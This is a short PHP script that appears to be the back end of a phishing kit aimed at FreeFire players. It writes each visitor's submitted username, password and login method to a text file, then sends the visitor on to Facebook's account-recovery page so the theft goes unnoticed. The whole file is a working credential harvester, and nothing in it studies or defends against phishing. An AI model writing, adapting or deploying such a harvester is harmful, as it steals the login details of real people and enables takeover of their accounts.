<?php 
file_put_contents("usernames.txt", "FreeFire Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "Login Method: " . $_POST['login-method'] ."\n", FILE_APPEND);
header('Location: https://facebook.com/recover/initiate/');
exit();
?>
